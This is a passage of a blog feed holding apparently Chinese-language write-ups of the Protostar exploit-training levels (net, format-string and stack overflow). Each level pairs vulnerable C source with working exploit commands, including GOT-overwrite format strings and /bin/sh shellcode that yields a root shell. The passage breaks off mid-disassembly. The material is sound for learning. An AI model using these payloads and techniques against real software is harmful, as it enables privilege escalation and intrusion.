997#define PORT 2997void run(){ unsigned int quad[4]; int i; unsigned int result, wanted; result = 0; for(i = 0; i &lt; 4; i++) {  quad[i] = random();  result += quad[i];  if(write(0, &amp;(quad[i]), sizeof(result)) != sizeof(result)) {   errx(1, &quot;:(\n&quot;);  } } if(read(0, &amp;wanted, sizeof(result)) != sizeof(result)) {  errx(1, &quot;:&lt;\n&quot;); } if(result == wanted) {  printf(&quot;you added them correctly\n&quot;); } else {  printf(&quot;sorry, try again. invalid\n&quot;); }}int main(int argc, char **argv, char **envp){ int fd; char *username; /* Run the process as a daemon */ background_process(NAME, UID, GID); /* Wait for socket activity and return */ fd = serve_forever(PORT); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io(fd); /* Don&apos;t do this :&gt; */ srandom(time(NULL)); run();}</code></pre><p>连接，查看：</p><pre><code>$ nc localhost 2997M▒▒jn(q]▒45678sorry, try again. invalid</code></pre><p>Python实现：</p><pre><code>import socketimport structRHOST = &apos;192.168.126.129&apos;RPORT = 2997s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((RHOST, RPORT))wanted = 0for i in xrange(4):data = s.recv(4)value = struct.unpack(&quot;i&quot;, data)[0]print &quot;Receive value: %d&quot; % valuewanted += valuewanted &amp;= 0xffffffffprint &quot;Sum: %d&quot; % wantedwanted = struct.pack(&quot;i&quot;, wanted)s.sendall(wanted)data = s.recv(1024)print &quot;%s&quot; % data # print the confirmations.close()</code></pre><p>结果：</p><pre><code>Receive value: 1336412356Receive value: 1995755184Receive value: 1089074857Receive value: 1737542227Sum: 1863817328you added them correctly</code></pre><p>##Net 3<br>About<br>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.</p><p>This level is at /opt/protostar/bin/net3</p><p>Source code</p><pre><code>#include &quot;../common/common.c&quot;#define NAME &quot;net3&quot;#define UID 996#define GID 996#define PORT 2996/* * Extract a null terminated string from the buffer */int get_string(char **result, unsigned char *buffer, u_int16_t len){ unsigned char byte; byte = *buffer; if(byte &gt; len) errx(1, &quot;badly formed packet&quot;); *result = malloc(byte); strcpy(*result, buffer + 1); return byte + 1;}/* * Check to see if we can log into the host */int login(unsigned char *buffer, u_int16_t len){ char *resource, *username, *password; int deduct; int success; if(len &lt; 3) errx(1, &quot;invalid login packet length&quot;); resource = username = password = NULL; deduct = get_string(&amp;resource, buffer, len); deduct += get_string(&amp;username, buffer+deduct, len-deduct); deduct += get_string(&amp;password, buffer+deduct, len-deduct); success = 0; success |= strcmp(resource, &quot;net3&quot;); success |= strcmp(username, &quot;awesomesauce&quot;); success |= strcmp(password, &quot;password&quot;); free(resource); free(username); free(password); return ! success;}void send_string(int fd, unsigned char byte, char *string){ struct iovec v[3]; u_int16_t len; int expected; len = ntohs(1 + strlen(string)); v[0].iov_base = &amp;len; v[0].iov_len = sizeof(len); v[1].iov_base = &amp;byte; v[1].iov_len = 1; v[2].iov_base = string; v[2].iov_len = strlen(string); expected = sizeof(len) + 1 + strlen(string); if(writev(fd, v, 3) != expected) errx(1, &quot;failed to write correct amount of bytes&quot;);}void run(int fd){ u_int16_t len; unsigned char *buffer; int loggedin; while(1) {  nread(fd, &amp;len, sizeof(len));  len = ntohs(len);  buffer = malloc(len);  if(! buffer) errx(1, &quot;malloc failure for %d bytes&quot;, len);  nread(fd, buffer, len);  switch(buffer[0]) {   case 23:    loggedin = login(buffer + 1, len - 1);    send_string(fd, 33, loggedin ? &quot;successful&quot; : &quot;failed&quot;);    break;   default:    send_string(fd, 58, &quot;what you talkin about willis?&quot;);    break;  } }}int main(int argc, char **argv, char **envp){ int fd; char *username; /* Run the process as a daemon */ background_process(NAME, UID, GID); /* Wait for socket activity and return */ fd = serve_forever(PORT); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io(fd); /* Don&apos;t do this :&gt; */ srandom(time(NULL)); run(fd);}</code></pre><p>直接上Python：</p><pre><code>import socketfrom struct import packfrom binascii import hexlifyRHOST = &apos;192.168.126.129&apos;RPORT = 2996s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((RHOST, RPORT))resource = &quot;net3&quot;resource = pack(&quot;B&quot;, len(resource)+1) + resource + &quot;\x00&quot;user = &quot;awesomesauce&quot;user = pack(&quot;B&quot;, len(user)+1) + user + &quot;\x00&quot;password = &quot;password&quot;password = pack(&quot;B&quot;, len(password)+1) + password + &quot;\x00&quot;auth = &quot;\x17&quot; + resource + user + passwordauth_len = pack(&quot;&gt;H&quot;, len(auth))packet = auth_len + authprint &quot;Send data: %s&quot; % hexlify(packet)s.sendall(packet)data = s.recv(1024)print &quot;%s&quot; % datas.close()</code></pre><p>结果：</p><pre><code>Send data: 001f17056e657433000d617765736f6d657361756365000970617373776f726400!successful</code></pre>]]></content>
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Exercise </tag>
            
            <tag> Exploit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Exploit Exercises Protostar Format Write-ups</title>
      <link href="/2014/10/10/Exploit-Exercises-Protostar-Format-Write-ups/"/>
      <url>/2014/10/10/Exploit-Exercises-Protostar-Format-Write-ups/</url>
      <content type="html"><![CDATA[<p>#Format</p><p>##Format 0<br>About<br>This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.</p><p>Hints:<br>This level should be done in less than 10 bytes of input.<br>“Exploiting format string vulnerabilities”<br>This level is at /opt/protostar/bin/format0</p><a id="more"></a><p>Source code：</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void vuln(char *string){ volatile int target; char buffer[64]; target = 0; sprintf(buffer, string); if(target == 0xdeadbeef) {  printf(&quot;you have hit the target correctly :)\n&quot;); }}int main(int argc, char **argv){ vuln(argv[1]);}</code></pre><p>根据提示，利用的是format string vulnerabilities，exploit如下：</p><pre><code>$ ./format0 `python -c &apos;print &quot;%64d\xef\xbe\xad\xde&quot;&apos;`you have hit the target correctly :)</code></pre><p>##Format 1<br>About<br>This level shows how format strings can be used to modify arbitrary memory locations.</p><p>Hints: objdump -t is your friend, and your input string lies far up the stack :)</p><p>This level is at /opt/protostar/bin/format1</p><p>Source code</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int target;void vuln(char *string){ printf(string); if(target) {  printf(&quot;you have modified the target :)\n&quot;); }}int main(int argc, char **argv){ vuln(argv[1]);}</code></pre><p>首先找到<code>target</code>的地址：</p><pre><code>$ objdump -t format1 | grep target08049638 g     O .bss   00000004              target</code></pre><p>所以先定位输入字符串的位置：</p><pre><code>./format1 `python -c &apos;print &quot;ABCDXX&quot; + &quot;%x.&quot;*124&apos;`ABCDXX804960c.bffffb88.8048469.b7fd8304.b7fd7ff4.bffffb88.8048435.bffffd40.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffc08.b7eadc76.2.bffffc34.bffffc40.b7fe1848.bffffbf0.ffffffff.b7ffeff4.804824d.1.bffffbf0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffc08.b5af584.2115a394.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffc34.8048450.8048440.b7ff1040.bffffc2c.b7fff8f8.2.bffffd36.bffffd40.0.bffffebb.bffffedd.bffffee7.bffffefb.bfffff0d.bfffff1d.bfffff30.bfffff3d.bfffff48.bfffff86.bfffff97.bfffffa5.bfffffbc.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffffd1b.1f.bffffff2.f.bffffd2b.0.0.c3000000.ea2e94fb.177dfa56.9fcc7530.698c36a1.363836.0.2f2e0000.6d726f66.317461.44434241.</code></pre><p>可以看到是在124的位置，将前面的<code>ABCD</code>换成<code>target</code>的地址，然后利用<code>%n</code>将字符串的长度写入<code>target</code>中：</p><pre><code>./format1 `python -c &apos;print &quot;\x38\x96\x04\x08&quot; + &quot;X&quot; * 2 + &quot;%x.&quot;*123 + &quot;%n.&quot;&apos;`8XX804960c.bffffb88.8048469.b7fd8304.b7fd7ff4.bffffb88.8048435.bffffd40.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffc08.b7eadc76.2.bffffc34.bffffc40.b7fe1848.bffffbf0.ffffffff.b7ffeff4.804824d.1.bffffbf0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffc08.76fa3230.5cb56420.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffc34.8048450.8048440.b7ff1040.bffffc2c.b7fff8f8.2.bffffd36.bffffd40.0.bffffebb.bffffedd.bffffee7.bffffefb.bfffff0d.bfffff1d.bfffff30.bfffff3d.bfffff48.bfffff86.bfffff97.bfffffa5.bfffffbc.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffffd1b.1f.bffffff2.f.bffffd2b.0.0.21000000.890598f2.e3a7c486.5d920159.6908e92e.363836.0.2f2e0000.6d726f66.317461..you have modified the target :)</code></pre><p>##Format 2<br>About<br>This level moves on from format1 and shows how specific values can be written in memory.</p><p>This level is at /opt/protostar/bin/format2</p><p>Source code</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int target;void vuln(){ char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printf(buffer); if(target == 64) {  printf(&quot;you have modified the target :)\n&quot;); } else {  printf(&quot;target is %d :(\n&quot;, target); }}int main(int argc, char **argv){ vuln();}</code></pre><p>依旧找<code>target</code>的位置：</p><pre><code>$ objdump -t format2 | grep target080496e4 g     O .bss   00000004              target</code></pre><p>这里依旧需要找输入字符串的位置，这里用Python的循环来实现：</p><pre><code>$ python -c &apos;print &quot;AAAA&quot;+&quot;.&quot;.join([&quot;%d:%%x&quot; % i for i in range(1,16)])&apos; | ./format2AAAA1:200.2:b7fd8420.3:bffffb34.4:41414141.5:78253a31.6:253a322e.7:3a332e78.8:342e7825.9:2e78253a.10:78253a35.11:253a362e.12:3a372e78.13:382e7825.14:2e78253a.15:78253a39</code></pre><p>target is 0 :(<br>现在找到了，构造shellcode：</p><pre><code>$ python -c &apos;print &quot;\xe4\x96\x04\x08%4$n&quot;&apos; | ./format2                                  ▒target is 4 :(</code></pre><p>##Format 3<br>About<br>This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.</p><p>This level is at /opt/protostar/bin/format3</p><p>Source code</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int target;void printbuffer(char *string){ printf(string);}void vuln(){ char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printbuffer(buffer); if(target == 0x01025544) {  printf(&quot;you have modified the target :)\n&quot;); } else {  printf(&quot;target is %08x :(\n&quot;, target); }}int main(int argc, char **argv){ vuln();}</code></pre><p>依旧<code>target</code>地址：</p><pre><code>$ objdump -t format3 | grep target080496f4 g O .bss 00000004 target</code></pre><p>找位置：</p><pre><code>$ python -c &apos;print &quot;AAAA&quot;+&quot;.&quot;.join([&quot;%d:%%x&quot; % i for i in range(1,16)])&apos; | ./format3AAAA1:0.2:bffffaf0.3:b7fd7ff4.4:0.5:0.6:bffffcf8.7:804849d.8:bffffaf0.9:200.10:b7fd8420.11:bffffb34.12:41414141.13:78253a31.14:253a322e.15:3a332e78target is 00000000 :(</code></pre><p>修改<code>target</code>的值：</p><pre><code>$ python -c &apos;print &quot;\xf4\x96\x04\x08&quot;+&quot;\xf6\x96\x04\x08&quot;+&quot;%12$n%13$n&quot;&apos; | ./format3target is 00080008 :(</code></pre><p>可以看到<code>target</code>的值为<code>0x00080008</code>，需要修改为<code>0x01025544</code>，先修改前半部分，<code>0x5544=21828</code>，修减掉前面字符串的长度8：</p><pre><code>$ python -c &apos;print &quot;\xf4\x96\x04\x08&quot;+&quot;\xf6\x96\x04\x08&quot;+&quot;%21820x%12$n&quot;+&quot;%13$n&quot;&apos; | ./format3target is 55445544 :(</code></pre><p>修改后半部分，<code>0x0102=258</code>，由于前面长度已经超过258了，所以要计算<code>0x10102=65794</code>，<code>65794=8+21820+43966</code>：</p><pre><code>$ python -c &apos;print &quot;\xf4\x96\x04\x08&quot;+&quot;\xf6\x96\x04\x08&quot;+&quot;%21820x%12$n&quot;+&quot;%43966x%13$n&quot;&apos; | ./format3you have modified the target :)</code></pre><p>##Format 4<br>About<br>format4 looks at one method of redirecting execution in a process.</p><p>Hints: objdump -TR is your friend</p><p>This level is at /opt/protostar/bin/format4</p><p>Source code</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int target;void hello(){ printf(&quot;code execution redirected! you win\n&quot;); _exit(1);}void vuln(){ char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printf(buffer); exit(1);}int main(int argc, char **argv){ vuln();}</code></pre><p>先来找<code>exit()</code>的地址：</p><pre><code>$ objdump -TR format4 | grep exit00000000 DF *UND* 00000000 GLIBC_2.0 _exit00000000 DF *UND* 00000000 GLIBC_2.0 exit08049718 R_386_JUMP_SLOT _exit08049724 R_386_JUMP_SLOT exit</code></pre><p>再看<code>hello()</code>的地址：</p><pre><code>(gdb) disas helloDump of assembler code for function hello:0x080484b4 &lt;hello+0&gt;: push %ebp0x080484b5 &lt;hello+1&gt;: mov %esp,%ebp0x080484b7 &lt;hello+3&gt;: sub $0x18,%esp0x080484ba &lt;hello+6&gt;: movl $0x80485f0,(%esp)0x080484c1 &lt;hello+13&gt;: call 0x80483dc &lt;puts@plt&gt;0x080484c6 &lt;hello+18&gt;: movl $0x1,(%esp)0x080484cd &lt;hello+25&gt;: call 0x80483bc &lt;_exit@plt&gt;End of assembler dump.</code></pre><p>跟之前一样，找字符串的位置：</p><pre><code>$ python -c &apos;print &quot;AAAA&quot;+&quot;.&quot;.join([&quot;%d:%%x&quot; % i for i in range(1,16)])&apos; | ./format4AAAA1:200.2:b7fd8420.3:bffffb34.4:41414141.5:78253a31.6:253a322e.7:3a332e78.8:342e7825.9:2e78253a.10:78253a35.11:253a362e.12:3a372e78.13:382e7825.14:2e78253a.15:78253a39</code></pre><p>找到之后，需要把<code>0x080484b4</code>写到<code>0x08049724</code>对应的内存中，跟前面类似，分两部分，<code>0x84b4=33972</code>，<code>0x0804=2052</code>，由于2052太小，使用<code>0x10804=67588</code>，<code>67588-33972=33616</code>：</p><pre><code>$ python -c &apos;print &quot;\x24\x97\x04\x08&quot;+&quot;\x26\x97\x04\x08&quot;+&quot;%33964x%4$n&quot;+&quot;%33616x%5$n&quot;&apos; | ./format4...code execution redirected! you win</code></pre>]]></content>
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Exercise </tag>
            
            <tag> Exploit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Exploit Exercises Protostar Stack Write-ups</title>
      <link href="/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/"/>
      <url>/2014/10/10/Exploit-Exercises-Protostar-Stack-Write-ups/</url>
      <content type="html"><![CDATA[<p>#Stack</p><p>##Stack 0<br>About<br>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.</p><p>This level is at /opt/protostar/bin/stack0</p><a id="more"></a><p>Source code</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv){ volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) {  printf(&quot;you have changed the &apos;modified&apos; variable\n&quot;); } else {  printf(&quot;Try again?\n&quot;); }}</code></pre><p>从源码看，modified在buffer上面，而buffer的size是64，所以只要给buffer值超出64bytes，就可以了，如下：</p><pre><code>$python -c &apos;print &quot;A&quot;*68&apos; | ./stack0you have changed the &apos;modified&apos; variable</code></pre><p>##Stack 1<br>About<br>This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.</p><p>Hints:</p><p>If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.<br>Protostar is little endian<br>This level is at /opt/protostar/bin/stack1</p><p>Source code</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv){ volatile int modified; char buffer[64]; if(argc == 1) {  errx(1, &quot;please specify an argument\n&quot;); } modified = 0; strcpy(buffer, argv[1]); if(modified == 0x61626364) {  printf(&quot;you have correctly got the variable to the right value\n&quot;); } else {  printf(&quot;Try again, you got 0x%08x\n&quot;, modified); }}</code></pre><p>根据源代码，需要将modified修改成0x61626364，提示说“Protostar is little endian”，所以，要将顺序倒过来：</p><pre><code>$python -c &apos;print &quot;A&quot;*64+&quot;\x64\x63\x62\x61&quot;&apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba</code></pre><p>然后，将以上作为参数运行stack1：</p><pre><code>$./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcbayou have correctly got the variable to the right value</code></pre><p>##Stack 2<br>About<br>Stack2 looks at environment variables, and how they can be set.</p><p>This level is at /opt/protostar/bin/stack2</p><p>Source code</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv){ volatile int modified; char buffer[64]; char *variable; variable = getenv(&quot;GREENIE&quot;); if(variable == NULL) {  errx(1, &quot;please set the GREENIE environment variable\n&quot;); } modified = 0; strcpy(buffer, variable); if(modified == 0x0d0a0d0a) {  printf(&quot;you have correctly modified the variable\n&quot;); } else {  printf(&quot;Try again, you got 0x%08x\n&quot;, modified); }}</code></pre><p>这里是从环境变量GREENIE获取数据，运行前先添加GREENIE，如下：</p><pre><code>$ GREENIE=`python -c &apos;print &quot;A&quot;*64+&quot;\x0a\x0d\x0a\x0d&quot;&apos;`$ ./stack2you have correctly modified the variable</code></pre><p>##Stack 3<br>About<br>Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)</p><p>Hints:</p><p>both gdb and objdump is your friend you determining where the win() function lies in memory.<br>This level is at /opt/protostar/bin/stack3</p><p>Source code</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void win(){ printf(&quot;code flow successfully changed\n&quot;);}int main(int argc, char **argv){ volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) {  printf(&quot;calling function pointer, jumping to 0x%08x\n&quot;, fp);  fp(); }}</code></pre><p>这次我们需要修改fp的值为win()函数的地址，先用gdb加载stack3，然后反汇编win函数，如下：</p><pre><code>(gdb) disassemble winDump of assembler code for function win:0x08048424 &lt;win+0&gt;:     push   %ebp0x08048425 &lt;win+1&gt;:     mov    %esp,%ebp0x08048427 &lt;win+3&gt;:     sub    $0x18,%esp0x0804842a &lt;win+6&gt;:     movl   $0x8048540,(%esp)0x08048431 &lt;win+13&gt;:    call   0x8048360 &lt;puts@plt&gt;0x08048436 &lt;win+18&gt;:    leave0x08048437 &lt;win+19&gt;:    retEnd of assembler dump.</code></pre><p>得到win函数的地址为0x08048424，命令如下：</p><pre><code>$python -c &apos;print &quot;A&quot;*64+&quot;\x24\x84\x04\x08&quot;&apos; | ./stack3calling function pointer, jumping to 0x08048424code flow successfully changed</code></pre><p>##Stack 4<br>About<br>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.</p><p>Hints:</p><p>A variety of introductory papers into buffer overflows may help.<br>gdb lets you do “run &lt; input”<br>EIP is not directly after the end of buffer, compiler padding can also increase the size.<br>This level is at /opt/protostar/bin/stack4</p><p>Source code</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void win(){ printf(&quot;code flow successfully changed\n&quot;);}int main(int argc, char **argv){ char buffer[64]; gets(buffer);}</code></pre><p>首先，gdb调试stack4，进入后，反汇编main函数：</p><pre><code>(gdb) disas mainDump of assembler code for function main:0x08048408 &lt;main+0&gt;:    push   %ebp0x08048409 &lt;main+1&gt;:    mov    %esp,%ebp0x0804840b &lt;main+3&gt;:    and    $0xfffffff0,%esp0x0804840e &lt;main+6&gt;:    sub    $0x50,%esp0x08048411 &lt;main+9&gt;:    lea    0x10(%esp),%eax0x08048415 &lt;main+13&gt;:   mov    %eax,(%esp)0x08048418 &lt;main+16&gt;:   call   0x804830c &lt;gets@plt&gt;0x0804841d &lt;main+21&gt;:   leave0x0804841e &lt;main+22&gt;:   retEnd of assembler dump.</code></pre><p>在main+21处加断点：</p><pre><code>(gdb) break *main+21Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.</code></pre><p>执行，然后输入<code>aaaaaaaaaa</code>：</p><pre><code>(gdb) runStarting program: /opt/protostar/bin/stack4aaaaaaaaaaBreakpoint 1, main (argc=1, argv=0xbffffcd4) at stack4/stack4.c:1616      stack4/stack4.c: No such file or directory.    in stack4/stack4.c</code></pre><p>从栈顶开始查看，得到buffer的位置是<code>0xbffffbe0</code>：</p><pre><code>(gdb) x/80xw $esp0xbffffbd0:     0xbffffbe0      0xb7ec6165      0xbffffbe8      0xb7eada750xbffffbe0:     0x61616161      0x61616161      0xbf006161      0x080482e80xbffffbf0:     0xb7ff1040      0x080495ec      0xbffffc28      0x080484490xbffffc00:     0xb7fd8304      0xb7fd7ff4      0x08048430      0xbffffc280xbffffc10:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff40xbffffc20:     0x08048430      0x00000000      0xbffffca8      0xb7eadc760xbffffc30:     0x00000001      0xbffffcd4      0xbffffcdc      0xb7fe18480xbffffc40:     0xbffffc90      0xffffffff      0xb7ffeff4      0x0804824b0xbffffc50:     0x00000001      0xbffffc90      0xb7ff0626      0xb7fffab00xbffffc60:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x000000000xbffffc70:     0xbffffca8      0xd824b630      0xf264a020      0x000000000xbffffc80:     0x00000000      0x00000000      0x00000001      0x080483400xbffffc90:     0x00000000      0xb7ff6210      0xb7eadb9b      0xb7ffeff40xbffffca0:     0x00000001      0x08048340      0x00000000      0x080483610xbffffcb0:     0x08048408      0x00000001      0xbffffcd4      0x080484300xbffffcc0:     0x08048420      0xb7ff1040      0xbffffccc      0xb7fff8f80xbffffcd0:     0x00000001      0xbffffde3      0x00000000      0xbffffdfd0xbffffce0:     0xbffffe07      0xbffffe29      0xbffffe3d      0xbffffe4d0xbffffcf0:     0xbffffe5f      0xbffffe72      0xbffffebe      0xbfffff0b0xbffffd00:     0xbfffff18      0xbfffff24      0xbfffff2f      0xbfffff6d</code></pre><p>返回地址存放在ebp+4处，所以算一下此处到buffer起始位置的长度：</p><pre><code>(gdb) p $ebp+4-0xbffffbe0$1 = (void *) 0x4c</code></pre><p>最后得到一下命令：</p><pre><code>$python -c &apos;print &quot;A&quot;*76+&quot;\xf4\x83\x04\x08&quot;&apos; | ./stack4code flow successfully changed</code></pre><p>##Stack 5<br>About<br>Stack5 is a standard buffer overflow, this time introducing shellcode.</p><p>Hints:</p><p>At this point in time, it might be easier to use someone elses shellcode<br>If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger<br>remove the int3s once your shellcode is done.<br>This level is at /opt/protostar/bin/stack5</p><p>Source code</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv){ char buffer[64]; gets(buffer);}</code></pre><p>根据上面，我们构造如下exploit代码：</p><pre><code>python -c &apos;print &quot;A&quot;*76+&quot;\x40\xfc\xff\xbf&quot;+&quot;\x90&quot;*16+&quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;&apos; | ./stack5</code></pre><p>运行后提示<code>Segmentation fault</code>，可能原因是gdb看到的地址跟实际执行的不一样，这里只能分析core dump来得到正确的地址。</p><pre><code>$ulimit -c unlimited #不限制core文件的大小$cat /proc/sys/kernel/core_pattern #查看core文件位置与格式/tmp/core.%s.%e.%p#echo 1 &gt;/proc/sys/fs/suid_dumpable #设置生成core文件</code></pre><p>重新运行exploit代码：</p><pre><code>$python -c &apos;print &quot;A&quot;*76+&quot;\x40\xfc\xff\xbf&quot;+&quot;\x90&quot;*16+&quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;&apos; | ./stack5(Segmentation fault (core dumped))</code></pre><p>查看dump文件：</p><pre><code>$ ls /tmp/core.11.stack5.1868</code></pre><p>使用gdb分析core文件：</p><pre><code># gdb -q -c /tmp/core.11.stack5.1868Core was generated by `./stack5&apos;.Program terminated with signal 11, Segmentation fault.#0  0xbffffe18 in ?? ()(gdb) x/40xw $esp-1000xbffffcac:     0x080483d9      0xbffffcc0      0xb7ec6165      0xbffffcc80xbffffcbc:     0xb7eada75      0x01413db6      0x41414141      0x414141410xbffffccc:     0x41414141      0x41414141      0x41414141      0x414141410xbffffcdc:     0x41414141      0x41414141      0x41414141      0x414141410xbffffcec:     0x41414141      0x41414141      0x41414141      0x414141410xbffffcfc:     0x41414141      0x41414141      0x41414141      0x414141410xbffffd0c:     0xbffffe10      0x90909090      0x90909090      0xc03190900xbffffd1c:     0x06b0db31      0x685380cd      0x7974742f      0x65642f680xbffffd2c:     0x31e38976      0x12b966c9      0xcd05b027      0x50c031800xbffffd3c:     0x732f2f68      0x622f6868      0xe3896e69      0xe1895350</code></pre><p>所以新的返回地址应该是<code>0xbffffd10</code>，如下：</p><pre><code>$python -c &apos;print &quot;A&quot;*76 + &quot;\x10\xfd\xff\xbf&quot; + &quot;\x90&quot;*10 + &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;&apos; | ./stack5# iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</code></pre><p>##Stack 6<br>About<br>Stack6 looks at what happens when you have restrictions on the return address.</p><p>This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.</p><p>It is strongly suggested you experiment with multiple ways of getting your code to execute here.</p><p>This level is at /opt/protostar/bin/stack6</p><p>Source code</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void getpath(){        char buffer[64];        unsigned int ret;        printf(&quot;input path please: &quot;); fflush(stdout);        gets(buffer);        ret = __builtin_return_address(0);        if((ret &amp; 0xbf000000) == 0xbf000000) {                printf(&quot;bzzzt (%p)\n&quot;, ret);                _exit(1);        }        printf(&quot;got path %s\n&quot;, buffer);}int main(int argc, char **argv){        getpath();}</code></pre><p>根据提示，此题有三种解法，这里只介绍一种。</p><p>1、finding the duplicate of the payload<br>此方法暂时不知道。</p><p>2、ret2libc<br>shellcode构造一般思路是：</p><pre><code>address of system() + address of exit() + address of command</code></pre><p>但这里有个问题，用<code>system()</code>执行命令时会“drop root privileges”，所以用这个无法直接获取有root权限的shell，这里就不尝试了。</p><p>3、return orientated programming<br>先反汇编<code>getpath</code>：</p><pre><code>(gdb) disas getpathDump of assembler code for function getpath:0x08048484 &lt;getpath+0&gt;: push   %ebp0x08048485 &lt;getpath+1&gt;: mov    %esp,%ebp0x08048487 &lt;getpath+3&gt;: sub    $0x68,%esp0x0804848a &lt;getpath+6&gt;: mov    $0x80485d0,%eax0x0804848f &lt;getpath+11&gt;:        mov    %eax,(%esp)0x08048492 &lt;getpath+14&gt;:        call   0x80483c0 &lt;printf@plt&gt;0x08048497 &lt;getpath+19&gt;:        mov    0x8049720,%eax0x0804849c &lt;getpath+24&gt;:        mov    %eax,(%esp)0x0804849f &lt;getpath+27&gt;:        call   0x80483b0 &lt;fflush@plt&gt;0x080484a4 &lt;getpath+32&gt;:        lea    -0x4c(%ebp),%eax0x080484a7 &lt;getpath+35&gt;:        mov    %eax,(%esp)0x080484aa &lt;getpath+38&gt;:        call   0x8048380 &lt;gets@plt&gt;0x080484af &lt;getpath+43&gt;:        mov    0x4(%ebp),%eax0x080484b2 &lt;getpath+46&gt;:        mov    %eax,-0xc(%ebp)0x080484b5 &lt;getpath+49&gt;:        mov    -0xc(%ebp),%eax0x080484b8 &lt;getpath+52&gt;:        and    $0xbf000000,%eax0x080484bd &lt;getpath+57&gt;:        cmp    $0xbf000000,%eax0x080484c2 &lt;getpath+62&gt;:        jne    0x80484e4 &lt;getpath+96&gt;0x080484c4 